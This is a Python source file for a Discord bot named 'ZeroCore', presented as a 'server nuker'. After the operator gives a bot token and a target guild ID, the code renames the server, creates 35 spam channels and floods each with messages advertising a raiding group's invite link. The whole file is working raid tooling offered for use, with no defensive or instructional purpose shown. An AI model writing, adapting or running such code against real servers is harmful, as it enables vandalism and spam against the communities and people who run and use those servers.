import discord
from discord.ext import commands
import asyncio
import os
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def hacker_intro():
    clear()
    print("\033[91m")  # czerwony kolor
    print(r"""
    ███████╗███████╗██████╗  ██████╗  ██████╗ ██████╗ ███████╗
    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝
      ███╔╝ █████╗  ██████╔╝██║   ██║██║     ██║   ██║█████╗  
     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║     ██║   ██║██╔══╝  
    ███████╗███████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝███████╗
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝
    """)
    print("\033[0m")  # reset koloru
    print("                  [ DISCORD SERVER NUKER BEST IN 2026. ]")
    print("                           v1.0 - ZERO CORE")
    print("="*70)
    time.sleep(1.5)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    clear()
    print("[+] ZeroCore connected as", bot.user)
    print("[+] Ready for destruction.\n")

    print("1. Discord Server Nuker")
    print("2. Exit")
    choice = input("\nChoose option: ").strip()

    if choice == "2":
        print("[-] Exiting ZeroCore...")
        await bot.close()
        return

    if choice == "1":
        await start_nuke()

async def start_nuke():
    guild_id = int(input("\nServer Guild ID: "))
    guild = bot.get_guild(guild_id)

    if not guild:
        print("[-] Bot is not on this server!")
        await bot.close()
        return

    print(f"[+] Target acquired: {guild.name}")

    confirm = input("\nType 'START' to initiate full destruction: ").strip().upper()

    if confirm != "START":
        print("[-] Operation cancelled.")
        await bot.close()
        return

    print("\n\033[91m[!!!] INITIATING FULL SERVER DESTRUCTION [!!!]\033[0m\n")

    # Zmiana nazwy serwera
    try:
        await guild.edit(name="Z̵e̷r̶o̴c̴o̸r̴e̷")
        print("[+] Server name corrupted")
    except:
        print("[-] Failed to corrupt server name")

    # Nazwy kanałów
    channel_names = [
        "Z̵e̷r̶o̴c̴o̸r̴e̷",
        "🤡U̷s̸e̸A̴n̷t̸i̸R̵a̴i̷d̵D̶u̶m̴m̷y̷s̴",
        "T̴o̵o̷ ̷s̵l̵o̷w̷ ̸n̸w̶o̴r̷d̸s̵ 🤡"
    ]

    spam_messages = [
        "Wanna destroy servers? Join our discord server Tu3cm3wcBC ",
        "Oh no we ran into problem your server got destroyed by ZeroCore Tu3cm3wcBC",
        "discord.gg/Tu3cm3wcBC JOIN OUR REALM!"
    ]

    print("[+] Flooding with channels...")

    for i in range(35):
        try:
            ch = await guild.create_text_channel(channel_names[i % 3])
            print(f"  [+] Deployed channel: {ch.name}")

            for _ in range(3):
                for msg in spam_messages:
                    try:
                        await ch.send(msg)
                    except:
                        pass
                    await asyncio.sleep(0.18)
        except:
            pass
        await asyncio.sleep(0.5)

    print("\n\033[91m[+] DESTRUCTION SEQUENCE COMPLETED [+]\033[0m")
    print("    The server has been neutralized.")
    await bot.close()

# ====================== START ======================
if __name__ == "__main__":
    hacker_intro()
    token = input("Enter Bot Token: ").strip()
    asyncio.run(bot.start(token))